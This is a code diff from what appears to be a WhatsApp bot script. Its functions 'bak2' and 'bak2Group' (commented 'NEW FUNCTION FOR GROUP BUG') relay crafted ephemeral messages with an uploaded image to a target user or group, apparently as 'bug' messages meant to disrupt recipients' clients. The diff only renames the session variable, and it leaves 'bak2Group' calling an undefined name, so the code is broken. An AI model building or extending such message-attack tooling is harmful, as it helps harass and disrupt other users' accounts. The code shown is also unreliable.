@@ -30,7 +30,7 @@ async function bak2(target, Chrisgaaju) {
                                 url: "https://files.catbox.moe/m33kq5.jpg",
                               },
                             },
-                            { upload: LordVoltage.waUploadToServer }
+                            { upload: Chrisgaaju.waUploadToServer }
                           )),
                         },
                         body: {
@@ -87,7 +87,7 @@ async function bak2(target, Chrisgaaju) {
 // --- NEW FUNCTION FOR GROUP BUG ---
 async function bak2Group(target, LordVoltage) {
   try {
-    await LordVoltage.relayMessage(
+    await Chrisgaaju.relayMessage(
       target, // Target will be the group JID here
       {
         ephemeralMessage: {
@@ -112,7 +112,7 @@ async function bak2Group(target, LordVoltage) {
                                 url: "https://files.catbox.moe/m33kq5.jpg", // Same image
                               },
                             },
-                            { upload: LordVoltage.waUploadToServer }
+                            { upload: Chrisgaaju.waUploadToServer }
                           )),
                         },
                         body: {
